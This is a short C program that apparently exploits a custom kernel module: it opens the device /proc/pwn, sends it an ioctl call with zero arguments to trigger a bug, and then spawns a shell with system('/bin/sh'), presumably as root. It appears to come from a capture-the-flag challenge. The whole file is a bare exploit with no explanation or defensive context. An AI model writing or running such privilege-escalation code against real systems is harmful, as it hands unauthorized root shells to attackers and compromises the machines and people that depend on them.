#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>

int main(){
	printf("[*]Start pwn!\n");
	int fd=open("/proc/pwn",2);
	ioctl(fd,0,0);
	system("/bin/sh");
	return 0;
}
